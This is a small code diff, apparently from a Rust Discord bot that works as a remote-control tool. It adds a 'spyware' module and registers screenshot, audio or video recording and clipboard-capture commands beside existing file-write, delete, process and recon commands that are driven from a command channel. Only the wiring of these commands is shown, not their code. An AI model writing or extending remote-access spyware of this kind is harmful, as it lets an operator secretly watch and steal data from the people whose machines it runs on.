@@ -2,7 +2,9 @@ use crate::*;
 mod io;
 mod process;
 mod recon;
+mod spyware;
 mod utils;
+
 #[macro_export]
 macro_rules! say {
     ($ctx:expr, $buffer:expr) => {{
@@ -98,6 +100,9 @@ pub const COMMANDS: &[fn() -> poise::Command<crate::Data, crate::Error>] = &[
     io::write,
     io::mkdir,
     io::rm,
+    spyware::screenshot,
+    spyware::record,
+    spyware::clipboard,
 ];
 
 /// Check which should be applied to all commands coming from the command chanel
